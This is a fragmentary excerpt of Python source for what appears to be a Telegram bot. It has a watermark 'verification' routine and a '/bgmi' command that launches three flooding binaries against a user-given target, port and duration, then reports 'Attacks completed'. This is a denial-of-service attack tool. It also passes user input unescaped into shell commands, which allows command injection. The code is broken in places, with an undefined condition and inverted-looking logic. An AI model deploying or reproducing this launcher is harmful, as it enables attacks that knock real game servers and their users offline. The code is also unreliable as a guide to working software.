...
# Initial watermark and hash verification
CREATOR = "This File Is Made By @raj_magic"
BotCode = "2cf29b3b13bc0a3d344604210fc71907a768530a7b450ebd77f21c501811787b"

def verify_initial():
    # Compute the hash of the creator watermark
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()

    # Verify if the computed hash matches the predefined hash
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")
    print("Waiting for Verification... Please Wait....")

# Perform the initial verification
verify_initial()

# Enhanced verification using external files
def verify():
    print("Starting verification...")
    # Add more detailed print statements here based on your verification process
    if some_condition_is_not_met:
        print("Verification failed: Condition not met.")
        raise Exception("Verification failed. This File Is Made By @raj_magic.")

# Perform the enhanced verification
verify()
...
# Updated Handler for /bgmi command
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                # Execute all three commands sequentially
                subprocess.run(f"./venompapa {target} {port} {time} 150", shell=True)
                subprocess.run(f"./JUPITER {target} {port} {time}", shell=True)
                subprocess.run(f"./packet_sender {target} {port} {time}", shell=True)
                
                response = f"𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅"
        else:
